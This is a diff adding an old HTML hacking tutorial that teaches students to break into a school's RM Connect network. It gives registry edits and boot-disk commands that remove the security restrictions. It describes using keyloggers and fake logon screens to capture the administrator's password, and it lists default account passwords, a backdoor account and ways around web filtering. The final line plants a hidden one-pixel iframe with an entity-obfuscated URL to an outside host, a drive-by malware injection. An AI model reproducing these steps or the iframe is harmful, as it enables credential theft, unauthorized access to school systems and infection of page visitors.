@@ -1,0 +1,466 @@
+
+<html>
+<head>
+   
+   <title>The RM Hacking Tutorial</title>
+</head>
+<body>
+
+<br><pre>
+                    :::::::::   ::::::::  :::::::::  :::::::::: 
+                    :+:    :+: :+:    :+: :+:    :+: :+:        
+                    +:+    +:+ +:+        +:+    +:+ +:+        
+                    +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                    +#+    +#+        +#+ +#+    +#+ +#+        
+                    #+#    #+# #+#    #+# #+#    #+# #+#        
+                    #########   ########  ###    ### ###  
+                         
+              	         http://blacksun.box.sk
+                           ____________________
+    ______________________I      Topic:        I_____________________
+   \                      I   The RM Hacking   I                    /
+    \     Html by         I      Tutorial      I   Written by:     /
+    >                     I                    I                  < 
+   /      <a href="mailto:mikkkeee@box.sk">Mikkkeee</a>        I____________________I   <a href="mailto:distant_nebula@hotmail.com">Distant Nebula</a>  \
+  /___________________________>           <_________________________\
+   			    </pre>
+Distant Nebulas Tutorial
+<p>Welcome To Distant Nebulas Tutorial. I will talk you through the easiest
+and most efficent way to hack the RM Connect Network!
+<p><b>.::Contents::.</b>
+<p>-<a href="#intro">Introduction 1.0</a>
+<br>-<a href="#disc">Disclaimer 1.1</a>
+<br>-<a href="#intro">Inroduction to RM 1.2</a>
+<br>-<a href="#restr">The Restrictions 1.3</a>
+<br>-<a href="#past">How to get past the Restrictions 1.4</a>
+<br>-<a href="#keylog">Setting up a Keylogger 1.5</a>
+<br>-<a href="#fake">Using Fake Logon Screens 1.6</a>
+<br>-<a href="#admin">Administrator tools 1.7</a>
+<br>-<a href="#default">Default Passwords 1.8</a>
+<br>-<a href="#filtering">Internet Filtering 1.9</a>
+<br>-<a href="#propagate">Propagate Account 2.0</a>
+<br>-<a href="#contact">Contact Information 2.1</a>
+<br>-<a href="#shout">Shout Outs 2.2</a>
+<p><b>-For Admin Password see 1.5 and 1.6</b>
+<p><a NAME="intro"></a><b>1.0 Introduction:</b>
+<br>Most schools are now using the most annoying network aroung 'RM Connect'.
+This textwill explain how to go about
+<br>hacking your way through it but before you read on read the disclaimer.
+<p><a NAME="disc"></a><b>1.1 Disclaimer:</b>
+<br>By reading this you are agreeing that I will not be held responsible
+for anything that you do with the contents of this text. Remember if you
+get caught you will be in big trouble and don't tell them where you got
+your information from because to be trully honest with you i don't care.
+<p><a NAME="intro"></a><b>1.2 Introduction to RM:</b>
+<br>Most schools are now using RM. The version that i will be talking about
+is&nbsp; the latset 2.3. 2.3 has the most restrictions possible and few
+security holes that we can take advantage of.
+<p><a NAME="restr"></a><b>1.3 The Restrictions:</b>
+<br>&nbsp;I will go through the most annoying restrictions that RM have
+introduced. They have disabled right click on the desktop, you can't access
+programs such as explorer, regedit, control pannel etc... My Computer has
+been disabled so you can't have easy access to the drives. Even if you
+do get to see all the drives you won't have access to drives such as L:
+which contains all the admin programs. You can't write to the hard drive
+and there are a lot more but I can't be bothered to go through them.
+<p><a NAME="past"></a><b>1.4 How to get past the Restrictions:</b>
+<br>All it takes is a simple reg file to run. Open up notepad and copy
+this in there
+<p>Regedit4
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+<br>"DisableRegistryTools"=dword:00000000
+<p>Now save this as a .reg file and run it. If this doesn't work for some
+reason save it as a .bfg file then double click and
+<br>you should get the open with box up. Now go to other c:\windows\regedit.exe
+and OK. Now run it.
+<p>If you want all the restriction to go away then add the following to
+the reg above
+<p>[HKEY_LOCAL_MACHINE\Software\ResearchMachines\NOATTRIB.VXD]
+<br>"loadvxd"=dword:00000000
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+<br>"NoDrives"=dword:00000000
+<br>"LinkResolveIgnoreLinkInfo"=dword:00000000
+<br>"NoFolderOptions"=dword:00000000
+<br>"ClearRecentDocsOnExit"=dword:00000000
+<br>"NoTrayContextMenu"=dword:00000000
+<br>"EnforceShellExtensionSecurity"=dword:00000000
+<br>"NoPrinterTabs"=dword:00000000
+<br>"NoDeletePrinter"=dword:00000000
+<br>"NoAddPrinter"=dword:00000000
+<br>"NoRun"=dword:00000000
+<br>"NoSetFolders"=dword:00000000
+<br>"NoSetTaskbar"=dword:00000000
+<br>"NoClose"=dword:00000000
+<br>"NoViewContextMenu"=dword:00000000
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+<br>"DisableRegistryTools"=dword:00000000
+<br>"NoDispScrSavPage"=dword:00000000
+<br>"NoDispAppearancePage"=dword:00000000
+<br>"NoDispSettingsPage"=dword:00000000
+<br>"NoAdminPage"=dword:00000000
+<br>"NoProfilePage"=dword:00000000
+<br>"NoDevMgrPage"=dword:00000000
+<br>"NoConfigPage"=dword:0000000
+<br>"NoFileSysPage"=dword:00000000
+<br>"NoDispCPL"=dword:00000000
+<br>"NoDispBackgroundPage"=dword:00000000
+<br>"NoVirtMemPage"=dword:00000000
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network]
+<br>"NoFileSharingControl"=dword:00000000
+<br>"NoPrintSharingControl"=dword:00000000
+<br>"NoNetSetup"=dword:00000000
+<br>"NoNetSetupIDPage"=dword:00000000
+<br>"NoNetSetupSecurityPage"=dword:00000000
+<br>"NoEntireNetwork"=dword:00000000
+<br>"NoWorkgroupContents"=dword:00000000
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp]
+<br>"NoRealMode"=dword:00000000
+<br>"Disable"=dword:00000000
+<p>[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop]
+<br>"NoHTMLWallPaper"=dword:00000000
+<br>"NoChangingWallPaper"=dword:00000000
+<br>"NoCloseDragDropBands"=dword:00000000
+<br>"NoMovingBands"=dword:00000000
+<br>"NoAddingComponents"=dword:00000000
+<br>"NoDeletingComponents"=dword:00000000
+<br>"NoEditingComponents"=dword:00000000
+<br>"NoClosingComponents"=dword:00000000
+<p>You can't keep this from working once you logoff unless you do the following.
+<p>Before we start you need a win9x or NT boot disk. Copy your new reg
+to c:\windows\spool\printers along with user.dat and
+<br>system.dat (c:\windows) Now reboot and put the boot disk in and when
+you are iin dos type the following
+<p>c:
+<br>cd windows\spool\printers
+<br>copy *.dat c:\windows
+<br>copy *.dat c:\backup
+<br>cd \
+<br>cd backup
+<br>copy user.dat user.da0
+<br>copy user.dat user.da1
+<br>copy system.dat system.da0
+<br>copy system.dat system.da1
+<br>copy *.da0 c:\windows
+<p>You have now done it.
+<p><a NAME="keylog"></a><b>1.5 Setting up a Keylogger:</b>
+<br>Now you have the edited reg running windows you can now use keyloggers.
+Use Echo or ik97 these don't have fixed directorys so you can hide them.
+To set them up you need to use one of RM Tools against them. First copy
+the contents of the keylogger to c:\windows\spool\printers and now on the
+start toolbar look for the little soldier in the tray and double click
+on him. This is DR Solomons virus checker. Now logoff your file and to
+your suprise you will see that DR Solomons is still up. In the help go
+to contents and then file, open. In the box type c:\windows\spool\printers
+and then *.exe now run the key logger from there. Now tell the admin that
+you have forgotten your password and with a bit of luck he might use your
+computer and fall into your trap. When he changes your password get back
+on the computer and go to c:\windows\spool\printers and run the txt file
+now the admin password will be there in front of you.
+<p><a NAME="fake"></a><b>1.6 Using Fake Logon Screens:</b>
+<br>Believe me this is fun to do. I recommend either XLOGONRM or projectx
+both of these can be downloaded from my web site. Both of these have advantages
+and disadvantages.
+<br>XLOGONRM:
+<br>This is ran from your disk
+and makes a fake logoff button once you logoff (you really do logoff your
+file which is
+<br>good) this will bring up a fake logon box. It is weird with my school
+because the fake one loads up then the real one
+<br>comes in front just move the real one out the way and click on the
+fake one. Just get the admin to use it and it will say
+<br>password is wrong when you go on again it will save the password straight
+todisk. Note there is a file called config.ini
+<br>where you can change the domain name and logos. A disadvantage is it
+wont start up at the beginning like projectx does but
+<br>with projectx you can't&nbsp; change the domain name. Another disadvantage
+is you can only store up to 10 passwords on a disk.
+<br>ProjectX:
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; This one is probably
+my favourite. It starts up when the PC is turned on and will store as many
+passwords as it
+<br>likes. Disadvantages are that unlike XLOGONRM it needs to be ran from
+the hard drive so other people could see the passwords and you can't change
+the domain name or the logo.
+<p><a NAME="admin"></a><b>1.7 Administrator Tools:</b>
+<p>RM Password Manager: Change everones password
+<br>except admin accounts. (available from my site)
+<br>RM User Manager: Change everyones restrictions
+<br>and add new users (available from my site)
+<br>RM Desktop Manager: Change everybodys desktop
+<br>(available from my site)
+<br>Application Wizard: Add programs across the
+<br>network
+<br>All of these tools are found in L: this drive is
+<br>only in admin accounts or deskman.
+<p><a NAME="default"></a><b>1.8 Default Passwords</b>
+<br>
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="22%">
+<br>&nbsp;
+<center><table BORDER CELLSPACING=0 CELLPADDING=0 WIDTH="70%" BGCOLOR="#999999" >
+<tr BGCOLOR="#666666">
+<td>
+<center><b><font color="#FFFFFF">User
+</td>
+
+<td>
+<center><b><font color="#FFFFFF">Password</center></b></font>
+</td>
+
+<td>
+<center><b><font color="#FFFFFF">Notes&nbsp;</font></b></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">admin2&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">changeme&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Normally Changed Admin Account</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td><font color="#FFFFFF"></font><font color="#FFFFFF"></font>
+<center>
+<p><font color="#FFFFFF">administrator&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">changeme&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Normally Changed Admin Account</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">deskalt</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;password</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">deskman</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;changeme&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Access L: to change the network</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">desknorm</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">password&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp; Standard Desktop</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">deskres</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;password</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">guest&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&lt;NO PASSWORD>&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Disabled by default</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">propagate</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;application</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">RMUSER1&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;password</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Works on RMUSER1 through to RMUSER49</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">temp1&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">&nbsp;password&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Not Confirmed</font></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">setup&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">changeme</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">teacher&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">password</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">topicalt&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">password</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">topicres&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">password</font></center>
+</td>
+
+<td><font color="#FFFFFF">&nbsp;</font></td>
+</tr>
+
+<tr BGCOLOR="#000000">
+<td>
+<center><font color="#FFFFFF">topicnorm&nbsp;</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">password</font></center>
+</td>
+
+<td></td>
+</tr>
+</table></center>
+
+<p><b>Other Passwords</b>
+<hr ALIGN=LEFT SIZE=1 NOSHADE WIDTH="15%">
+<br>&nbsp;
+<center><table BORDER CELLSPACING=0 CELLPADDING=0 WIDTH="70%" >
+<tr BGCOLOR="#000000">
+<td>
+<center><b><font color="#FFFFFF">For</font></b></center>
+</td>
+
+<td>
+<center><b><font color="#FFFFFF">Password</font></b></center>
+</td>
+
+<td>
+<center><b><font color="#FFFFFF">Notes</font></b></center>
+</td>
+</tr>
+
+<tr BGCOLOR="#666666">
+<td>
+<center><font color="#FFFFFF">BIOS</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">RM</font></center>
+</td>
+
+<td>
+<center><font color="#FFFFFF">Hit &lt;del> as the computer boots to enter
+the</font></center>
+</td>
+</tr>
+</table></center>
+
+<p>BIOS area
+<p><a NAME="filtering"></a><b>1.9 Internet Filtering:</b>
+<br>&nbsp;The easiest way to be able to view any web site is to go to <a href="http://babelfish.astalavista.com">http://babelfish.astalavista.com</a>
+this just type in the site you want to go to (remember http://) and go
+to translate german to english or whatever and there you go or you can
+try <a href="http://www.askjeeves.com">http://www.askjeeves.com</a> both
+of these work.
+<p><a NAME="propagate"></a><b>2.0 Propagate Account:</b>
+<br>This is a special account on the RM Network it is like a backdoor&nbsp;
+cause the password can't be changed the weird thing is that if you take
+the network cable out the back of the PC (the one that looks like a telephone
+wire) then the computer trys to connect to this account automatically.
+The password is Application. The propagate account isn't anything special
+it just has an unrestricted shell.
+<p><a NAME="contact"></a><b>2.1 Contact</b>
+<p>You can contact me at <a href="mailto:Distant_Nebula@hotmail.com">Distant_Nebula@Hotmail.com</a>
+Or go to this web site for more information <a href="http://www.freewebz.com/darkpages">http://www.freewebz.com/darkpages</a>
+<p><a NAME="shout"></a><b>2.2 Shout Outs</b>
+<p><b>Hi to Crystal Dagger, Merlin, Mr Big Feet, Fallen Angel</b>
+<p><a href="Http://blacksun.box.sk">Http://blacksun.box.sk</a>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
